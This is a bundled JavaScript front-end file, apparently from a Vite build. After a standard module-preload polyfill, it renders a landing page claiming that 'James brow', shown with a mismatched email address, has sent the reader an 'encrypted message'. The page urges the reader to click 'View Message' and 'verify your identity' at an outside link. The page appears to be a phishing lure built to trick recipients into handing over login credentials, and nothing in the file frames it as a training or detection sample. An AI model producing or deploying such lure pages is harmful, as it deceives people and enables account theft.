(function(){const s=document.createElement("link").relList;if(s&&s.supports&&s.supports("modulepreload"))return;for(const e of document.querySelectorAll('link[rel="modulepreload"]'))o(e);new MutationObserver(e=>{for(const t of e)if(t.type==="childList")for(const r of t.addedNodes)r.tagName==="LINK"&&r.rel==="modulepreload"&&o(r)}).observe(document,{childList:!0,subtree:!0});function n(e){const t={};return e.integrity&&(t.integrity=e.integrity),e.referrerPolicy&&(t.referrerPolicy=e.referrerPolicy),e.crossOrigin==="use-credentials"?t.credentials="include":e.crossOrigin==="anonymous"?t.credentials="omit":t.credentials="same-origin",t}function o(e){if(e.ep)return;e.ep=!0;const t=n(e);fetch(e.href,t)}})();const c="https://yourprofile.com",i="MorganR@northbp.com";document.querySelector("#app").innerHTML=`
  <div class="landing-container">
    <div class="message-card">
      <h1 class="sender-info">
        James brow (<a href="mailto:${i}" class="email-link">${i}</a>) has sent you a message.
      </h1>

      <a href="${c}" class="view-message-btn">
        View Message
      </a>

      <div class="instruction-box">
        <h2 class="instruction-title">UNENCRYPTED INSTRUCTION</h2>
        <p class="instruction-text">
          To view my encrypted message, locate <strong>View Message</strong>, you'll need to verify your identity.
          Please contact me if you have any difficulty or questions.
        </p>
      </div>
    </div>
  </div>
`;
